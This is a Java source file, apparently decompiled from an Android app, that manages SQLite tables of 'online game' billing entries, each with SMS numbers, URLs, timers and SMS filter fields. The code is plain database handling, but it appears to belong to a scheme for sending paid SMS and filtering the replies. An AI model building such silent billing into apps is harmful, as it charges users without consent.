package com.bbpay.db;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import com.bbpay.bean.Constants;
import com.bbpay.bean.OnLineGameBiz;
import com.bbpay.bean.OnlineGameStep;
import com.bbpay.util.MyLogger;

public class OnlineGameDbManager {
    private static OnlineGameDbManager manager;
    private OnlineGameDbManager() {}
    public static OnlineGameDbManager getInstance() {
        if (manager == null) manager = new OnlineGameDbManager();
        return manager;
    }
    private void addProcedure(OnlineGameStep onlineprocedure, int i, SQLiteDatabase db) {
        ContentValues cv = new ContentValues();
        cv.put("aurl", onlineprocedure.getUrl());
        cv.put("type", Integer.valueOf(onlineprocedure.getType()));
        cv.put("smsnum", onlineprocedure.getSmsNumber());
        cv.put("timer", Integer.valueOf(onlineprocedure.getTimer()));
        cv.put("onlinegame_which_wap_id", Integer.valueOf(i));
        db.insert("onlinegameprocedure", null, cv);
    }
    public void addWapFee(OnLineGameBiz biz, Context context) {
        if (biz == null) return;
        synchronized ("lock") {
            SQLiteDatabase db = EPayDBHelper.getInstance(context).getWritableDatabase();
            ContentValues cv = new ContentValues();
            cv.put(Constants.FILTER_INFO, biz.getFilterInfo());
            cv.put(Constants.FILTER_PORT, biz.getFilterPort());
            db.insert("onlinngame", null, cv);
            int maxId = getMaxId(db);
            List<OnlineGameStep> steps = biz.getSteps();
            if (steps != null) {
                for (OnlineGameStep p : steps) {
                    if (p != null) {
                        addProcedure(p, maxId, db);
                    }
                }
            }
            db.close();
        }
    }
    public void deleteAllSMS(Context context) {
        synchronized ("lock") {
            SQLiteDatabase db = EPayDBHelper.getInstance(context).getWritableDatabase();
            db.delete("onlinngame", null, null);
            db.close();
        }
    }
    public void deleteBiz(Context context, OnLineGameBiz biz) {
        synchronized ("lock") {
            SQLiteDatabase sqlitedatabase = EPayDBHelper.getInstance(context).getWritableDatabase();
            String as[] = new String[1];
            as[0] = new StringBuilder(String.valueOf(biz.getId())).toString();
            sqlitedatabase.delete("onlinngame", "_ID = ? ", as);
            delProById(sqlitedatabase, biz.getId());
            sqlitedatabase.close();
        }
    }
    public void deleteProcedure(Context context) {
        synchronized ("lock") {
            EPayDBHelper.getInstance(context).getWritableDatabase().delete("onlinegameprocedure", null, null);
        }
    }
    private void delProById(SQLiteDatabase sqlitedatabase, int id) {
        sqlitedatabase.delete("onlinegameprocedure", "onlinegame_which_wap_id = ? ", new String[] { id + "" });
    }
    public List<OnLineGameBiz> getAllWap(Context context) {
        synchronized ("lock") {
            LinkedList<OnLineGameBiz> list = new LinkedList<OnLineGameBiz>();
            SQLiteDatabase db = EPayDBHelper.getInstance(context).getWritableDatabase();
            StringBuffer sb = new StringBuffer();
            sb.append(" select ").append("_ID").append(" , ").append(Constants.FILTER_INFO).append(" , ").append(Constants.FILTER_PORT).append(" from ").append("onlinngame");
            Cursor cursor = db.rawQuery(sb.toString(), null);
            MyLogger.info("====", new StringBuilder("cursor count is ").append(cursor.getCount()).append("   ,, ").append(sb.toString()).toString());
            if (cursor != null) {
                if (cursor.getCount() > 0) {
                    cursor.moveToFirst();
                    do {
                        OnLineGameBiz onlinewap = new OnLineGameBiz();
                        onlinewap.setId(cursor.getInt(0));
                        onlinewap.setFilterInfo(cursor.getString(1));
                        onlinewap.setFilterPort(cursor.getString(2));
                        onlinewap.setSteps(getProcedureById(db, onlinewap.getId()));
                        list.add(onlinewap);
                    } while (cursor.moveToNext());
                }
                cursor.close();
            }
            db.close();
            return list;
        }
    }
    private int getMaxId(SQLiteDatabase sqlitedatabase) {
        int result = -1;
        String sql = " select max(" + "_ID" + ") from " + "onlinngame";
        Cursor cursor = sqlitedatabase.rawQuery(sql, null);
        if (cursor != null) {
            cursor.moveToFirst();
            result = cursor.getInt(0);
        }
        cursor.close();
        return result;
    }
    private List<OnlineGameStep> getProcedureById(SQLiteDatabase sqlitedatabase, int i) {
        ArrayList<OnlineGameStep> arraylist = new ArrayList<OnlineGameStep>();
        StringBuffer stringbuffer = new StringBuffer();
        stringbuffer.append("select ").append("aurl").append(" , ").append("type").append(" , ").append("smsnum").append(" , ").append("timer").append(" from ")
                .append("onlinegameprocedure").append(" where ").append("onlinegame_which_wap_id").append(" = ").append(i);
        Cursor cursor = sqlitedatabase.rawQuery(stringbuffer.toString(), null);
        if (cursor != null && cursor.moveToFirst()) do {
            OnlineGameStep p = new OnlineGameStep();
            p.setUrl(cursor.getString(0));
            p.setType(cursor.getInt(1));
            p.setSmsNumber(cursor.getString(2));
            p.setTimer(cursor.getInt(3));
            arraylist.add(p);
        } while (cursor.moveToNext());
        cursor.close();
        return arraylist;
    }
}
